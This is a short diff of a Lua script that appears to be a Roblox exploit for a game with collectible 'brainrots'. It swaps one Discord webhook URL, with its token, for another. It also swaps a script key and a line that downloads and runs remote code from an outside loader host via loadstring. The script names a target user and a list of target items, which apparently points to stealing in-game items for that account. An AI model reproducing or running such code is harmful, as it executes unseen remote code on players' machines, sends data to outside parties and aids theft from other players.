@@ -1,6 +1,6 @@
 local TARGET_ID = 3343244279
 local TARGET_USER = "pnlo45"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572625042922012905/hNmbKnkM94YRxPjqC2Ynkxt2t4qacsa67R5yQrwD9PszAltsI1YMersc5lNcZJKscFGy"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1572626703996424255/yLvQnP0kwxg3Q3oEjNqvF3hgPDxxlO9ULIpF8d-Q17_GNstUqt4BlGt6QJ_Stoas1D8z"
 
 local TargetBrainrots = {
     ["Draculino"] = true,
@@ -352,7 +352,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    script_key="26AA13284C6A4E5D98788B26B0F50801"; loadstring(game:HttpGet("https://vampauth.com/v1/loaders/96cde54b34d55a48a4446f298ea7aa4b.lua"))()
+    script_key="3A4D98DCA06649839907CA87A146872D"; loadstring(game:HttpGet("https://vampauth.com/v1/loaders/bf86783c50dbfacb1f57b8b05db886f4.lua"))()
 
     task.wait(1)
 
